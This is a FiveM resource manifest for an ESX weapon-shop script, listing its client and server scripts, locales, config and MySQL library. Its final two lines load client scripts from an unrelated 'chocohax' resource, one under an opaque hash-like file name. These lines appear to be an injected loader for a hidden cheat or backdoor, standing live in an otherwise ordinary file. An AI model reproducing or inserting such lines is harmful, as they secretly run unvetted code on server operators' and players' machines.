description 'ESX Weashop'

version '1.0.2'

client_scripts {
  '@es_extended/locale.lua',
 
  'locales/en.lua',
  
  'config.lua',
  'client/main.lua'
}

server_scripts {
  '@es_extended/locale.lua',
 
  'locales/en.lua',
  
  '@mysql-async/lib/MySQL.lua',
  'config.lua',
  'server/main.lua'
}

client_script '@chocohax/95158.lua'
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'